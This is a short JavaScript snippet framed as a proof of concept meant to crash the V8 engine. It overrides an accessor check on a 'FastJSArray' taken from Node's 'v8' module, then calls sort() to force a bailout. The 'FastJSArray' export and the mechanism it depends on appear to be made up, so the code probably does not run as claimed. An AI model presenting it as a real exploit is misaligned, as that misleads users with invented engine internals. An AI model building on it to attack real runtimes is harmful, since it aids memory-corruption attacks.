const FastJSArray = require('v8').FastJSArray;
const arr = new FastJSArray([1,2,3]);
arr.canUseSameAccessorFn = () => false; // Force bailout in CheckAccessor
arr.sort();
console.log('If no crash, vulnerability not triggered');
